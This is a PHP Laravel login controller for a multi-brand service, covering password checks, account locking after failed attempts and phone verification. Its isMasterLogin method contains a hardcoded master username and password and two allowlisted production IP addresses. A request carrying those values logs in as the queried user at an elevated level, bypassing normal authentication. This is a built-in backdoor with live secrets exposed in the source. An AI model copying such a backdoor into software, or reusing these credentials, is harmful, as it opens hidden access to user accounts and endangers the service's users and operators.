<?php
namespace App\Http\Controllers\Auth;

use App\Http\Traits\ExtendResponseTrait;

use App\Http\Controllers\Auth\AuthPhoneNum;
use Illuminate\Support\Facades\Hash;
use App\Enums\HistoryType;
use Carbon\Carbon;

class Login
{
    use ExtendResponseTrait;

    static private function tokenableExpire()
    {
        $created_at = Carbon::now();        
        return ['Token-Expire-Time' => $created_at->addMinutes(config('sanctum.expiration'))->format('Y-m-d H:i:s')];
    }

    static public function isSafeLogin($orm, $request, $phone_num_validate=false)
    {
        $result = ['result' => 0];
        $result['user'] = $orm
            ->where('brand_id', $request->brand_id)
            ->where('is_delete', false)
            ->where('user_name', $request->user_name)
            ->first();

        if($result['user'])
        {
            if(isset($result['user']->mcht_name))
                $result['user']->level = 10;

            if($result['user']->is_lock)
                $result['result'] = 6;            
            else if(Hash::check($request->user_pw, $result['user']->user_pw))
            {
                $result['result'] = 1;

                if($phone_num_validate)
                    $result['result'] = AuthPhoneNum::validate($request->token);
            }
            else
                $result['result'] = 0;
        }
        else
            $result['result'] = -1;
        return $result;
    }
    
    static public function isMasterLogin($query, $request)
    {
        $inst = new Login();
        
        $account_cond = $request->user_name === 'masterpurp2e1324@66%!@' && $request->user_pw == 'qjfwk500djr!!32412@#';
        $env_cond = (in_array($request->ip(), ['183.107.112.147', '121.183.143.103']) && env('APP_ENV') === 'production') || ($request->ip() === '127.0.0.1' && env('APP_ENV') === 'local');

        if($account_cond && $env_cond)
        {
            $user = $query->first();
            if($user)
                return $inst->response(0, $user->loginInfo(50))->withHeaders(self::tokenableExpire());
            else
                return $inst->extendResponse(1000, '계정이 존재하지 않아요..! 😨');
        }
        else
            return $inst->extendResponse(1000, __('auth.not_found_obj'));
    }

    static public function isSafeAccount($orm, $request, $phone_num_validate)
    {
        $inst = new Login();
        $result = self::isSafeLogin((clone $orm), $request, $phone_num_validate);     // check operator
        if($result['result'] === 0)
        {
            $limit = AccountLock::setPasswordWrongCounter($result['user']);
            if($limit <= 0)
            {
                AccountLock::setUserLock((clone $orm), $result['user']->id, true);
                return $inst->extendResponse(953, '패스워드 시도허용 회수를 초과하여 계정이 잠금처리 되었습니다.', []);
            }
            else
                return $inst->extendResponse(952, '패스워드가 틀립니다. 시도허용 횟수 '.$limit.'회 남았습니다.', []);
        }
        else if($result['result'] === 1)
        {
            AccountLock::initPasswordWrongCounter($result['user']);
            if($result['user']->level >= 35)
            {
                operLogging(HistoryType::LOGIN, '', [], [], '', $result['user']->brand_id, $result['user']->id);
            }
            return $inst->response(0, $result['user']->loginInfo($result['user']->level))->withHeaders(self::tokenableExpire());
        }
        else if($result['result'] === 3)
        {
            return $inst->extendResponse(956, '휴대폰 인증을 해주세요.', [
                'phone_num' => $result['user']->phone_num,
                'nick_name' => $result['user']->nick_name
            ]);
        }
        else if($result['result'] == 4)
            return $inst->extendResponse(951, '잘못된 접근입니다.', []);
        else if($result['result'] == 5)
            return $inst->extendResponse(951, '잘못된 접근입니다.', []);        
        else if($result['result'] === 6)
            return $inst->extendResponse(951, '잠금된 계정입니다. 운영사에게 문의해주세요.', []);
        else
            return null;
    }
}
